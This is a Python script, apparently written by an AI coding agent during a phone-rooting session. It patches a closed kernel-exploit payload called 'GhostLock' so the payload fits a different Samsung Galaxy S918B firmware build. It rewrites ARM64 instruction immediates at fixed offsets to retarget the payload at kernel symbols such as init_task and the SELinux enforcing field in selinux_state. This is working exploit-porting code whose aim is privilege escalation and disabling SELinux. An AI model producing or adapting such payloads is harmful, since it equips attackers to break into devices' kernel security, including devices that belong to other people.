#!/usr/bin/env python3
"""Extend port_zzhl.py's patch to the newly-identified symbols in the closed
F731U-derived GhostLock payload, using the same relative/virtual/alias
32-bit MOVZ(MOVN)+MOVK site-patching mechanism, now generalized to any
number of symbols instead of just the original 3."""
import hashlib
import json
import struct
from pathlib import Path

KIMAGE_TEXT_BASE = 0xFFFFFFC008000000
DIRECT_ALIAS_BASE = 0xFFFFFF8028000000  # == DIRECT_MAP_BASE(0xffffff8000000000) + fixed 0x28000000 delta

def rel_to(kind, relative):
    if kind == "relative":
        return relative
    if kind == "virtual":
        return KIMAGE_TEXT_BASE + relative
    if kind == "alias":
        return DIRECT_ALIAS_BASE + relative
    raise AssertionError(kind)

# Each site: (file_offset_shift0, file_offset_shift16, inverted_shift0)
# Values are ZZHL target relative offsets (independently re-verified from the
# dump this session: nm on kernel.elf, raw pointer reads, pahole on the
# re-extracted BTF -- see conversation for the derivation of each).
SYMBOLS = {
    "ASHMEM_MISC_FOPS": {
        "target_relative": 0x02bfd1f8,
        "confidence": "CONFIRMED exact (ground truth: SAFZH3 ASHMEM_MISC_FOPS_OFF=0x02bfcf28, byte-identical)",
        "sites": [
            ("relative", 0x2ff4, 0x3004, False),
            ("relative", 0x5644, 0x5654, False),
            ("relative", 0x672c, 0x6734, False),
            ("alias",    0x5664, 0x5670, True),
            ("alias",    0x671c, 0x6730, True),
        ],
    },
    "INIT_TASK": {
        "target_relative": 0x02c05380,
        "confidence": "CONFIRMED exact (ground truth: SAFZH3 INIT_TASK_OFF=0x02c05080, byte-identical)",
        "sites": [
            ("relative", 0x5678, 0x5680, False),
            ("virtual",  0x56a4, 0x56b4, True),
        ],
    },
    "SLIDE_NFULNL_LOGGER_OBJECT": {
        "target_relative": 0x02a91e50,
        "confidence": "CONFIRMED exact (ground truth: SAFZH3 SLIDE_NFULNL_LOGGER_OBJECT_OFF=0x02a91e48, byte-identical)",
        "sites": [
            ("alias", 0x5704, 0x5710, True),
            ("alias", 0x6a54, 0x6a64, True),
        ],
    },
    "SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR": {
        "target_relative": 0x02bbab48,
        "confidence": "CONFIRMED exact (ground truth: SAFZH3 SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF=0x02bba9c8, byte-identical)",
        "sites": [
            ("alias", 0x5708, 0x5714, True),
            ("alias", 0x69f0, 0x69f4, True),
            ("alias", 0x6a08, 0x6a14, True),
            ("alias", 0x6a38, 0x6a40, True),
        ],
    },
    "CONFIGFS_READ_ITER": {
        "target_relative": 0x005d89c0,
        "confidence": "CONFIRMED exact (ground truth: SAFZH3 CONFIGFS_READ_ITER_OFF=0x005d7420, byte-identical)",
        "sites": [
            ("relative", 0x596c, 0x597c, False),
            ("virtual",  0x5978, 0x5980, True),
        ],
    },
    "SLIDE_SYSCTL_BOOTID": {
        "target_relative": 0x02e6c131,
        "confidence": "CONFIRMED exact (ground truth: SAFZH3 SLIDE_SYSCTL_BOOTID_OFF=0x02e6c0b1, byte-identical)",
        "sites": [
            ("relative", 0x69d4, 0x69dc, False),
        ],
    },
    "SYSTEM_UNBOUND_WQ": {
        "target_relative": 0x02a90808,
        "confidence": "CONFIRMED exact (ground truth: SAFZH3 SYSTEM_UNBOUND_WQ_OFF=0x02a90800, byte-identical)",
        "sites": [
            ("alias",    0x8138, 0x814c, True),
            ("relative", 0x8148, 0x8150, False),
        ],
    },
    "COPY_SPLICE_READ": {
        "target_relative": 0x00528dcc,
        "confidence": "CONFIRMED exact (ground truth: sibling dm3q-S918BXXSAFZH3 helper-src/target-afzg1.h "
                       "has COPY_SPLICE_READ_OFF=0x00528198, byte-identical to this payload's own baked-in "
                       "value -- proves the site identification, independent of the delta heuristic)",
        "sites": [
            ("virtual", 0x5a74, 0x5a7c, True),
        ],
    },
    "NOOP_LLSEEK": {
        "target_relative": 0x004bc658,
        "confidence": "CONFIRMED exact (ground truth: SAFZH3 target-afzg1.h has NOOP_LLSEEK_OFF=0x004bbd34, "
                       "byte-identical to this payload's own baked-in value)",
        "sites": [
            ("virtual", 0x67e0, 0x67e4, True),
        ],
    },
    "ASHMEM_IOCTL": {
        "target_relative": 0x01151344,
        "confidence": "CONFIRMED exact (ground truth: SAFZH3 target-afzg1.h has ASHMEM_IOCTL_OFF=0x0114c6dc, "
                       "byte-identical; originally misclassified as noise -- delta-based neighborhood search "
                       "landed in unrelated vhost driver code because ZZHL's own drift for this symbol happens "
                       "to be large)",
        "sites": [
            ("relative", 0x59c4, 0x59cc, False),
            ("virtual",  0x59c8, 0x59d4, True),
        ],
    },
    "SELINUX_ENFORCING_GHOSTLOCK": {
        # NOTE: this is a DIFFERENT symbol than our own open-source engine's
        # SELINUX_ENFORCING (selinux_enforcing_boot, 0x02a3c40c) -- the
        # closed GhostLock engine instead targets a field ~64 bytes into
        # the newer `selinux_state` global (confirmed: SAFZH3's own
        # SELINUX_ENFORCING_OFF=0x02d8e5c0 is exactly selinux_state+0x40
        # on their kernel too, matching this payload's own baked-in value
        # exactly). ZZHL's selinux_state = 0xffffffc00ad8e600 (nm-verified),
        # so target = relative(selinux_state) + 0x40.
        "target_relative": 0x02d8e600 + 0x40,
        "confidence": "CONFIRMED exact site identification (ground truth match to SAFZH3); target value "
                       "derived from ZZHL's own nm-verified selinux_state address using the same +0x40 "
                       "convention SAFZH3 uses relative to its own selinux_state",
        "sites": [
            ("relative", 0x7fe8, 0x7ff0, False),
            ("alias",    0x7fec, 0x7ffc, True),
        ],
    },
    # ROOT_TASK_GROUP deliberately omitted: F731U's own baked-in value
    # (relative 0x02cb9ac0) is byte-identical to the verified ZZHL value,
    # so no patch is needed there -- included here only as a documented no-op.
}


def immediate(word):
    return (word >> 5) & 0xFFFF


def encode_field(old_word, new_imm16):
    return (old_word & ~(0xFFFF << 5)) | (new_imm16 << 5)


def main():
    src = Path("/home/matias/Projects/Root-My-Galaxy-SM-S918B/payload.ZZHL.so")
    dst = Path("/tmp/claude-1000/-home-matias/8fd10a41-c9c3-4dff-a688-4ee3cb41e363/scratchpad/payload.ZZHL.extended.so")
    data = bytearray(src.read_bytes())
    if len(data) != 131072:
        raise SystemExit(f"unexpected size {len(data)}")

    report = {"input_sha256": hashlib.sha256(data).hexdigest(), "symbols": {}}
    total_changed = 0

    for name, spec in SYMBOLS.items():
        target_rel = spec["target_relative"]
        sym_report = {"confidence": spec["confidence"], "fields": []}
        for kind, off0, off1, inv0 in spec["sites"]:
            new_value = rel_to(kind, target_rel) & 0xFFFFFFFF
            new_chunk0 = new_value & 0xFFFF
            new_chunk1 = (new_value >> 16) & 0xFFFF
            new_imm0 = (~new_chunk0 & 0xFFFF) if inv0 else new_chunk0
            new_imm1 = new_chunk1  # movk field never inverted

            for off, new_imm in ((off0, new_imm0), (off1, new_imm1)):
                old_word = struct.unpack_from("<I", data, off)[0]
                old_imm = immediate(old_word)
                new_word = encode_field(old_word, new_imm)
                struct.pack_into("<I", data, off, new_word)
                changed = old_imm != new_imm
                total_changed += 1 if changed else 0
                sym_report["fields"].append({
                    "file_offset": f"0x{off:x}", "old_immediate": f"0x{old_imm:04x}",
                    "new_immediate": f"0x{new_imm:04x}", "changed": changed,
                })
        report["symbols"][name] = sym_report

    report["output_sha256"] = hashlib.sha256(data).hexdigest()
    report["changed_bytes_estimate_fields"] = total_changed
    dst.write_bytes(bytes(data))
    print(json.dumps(report, indent=2))


if __name__ == "__main__":
    main()
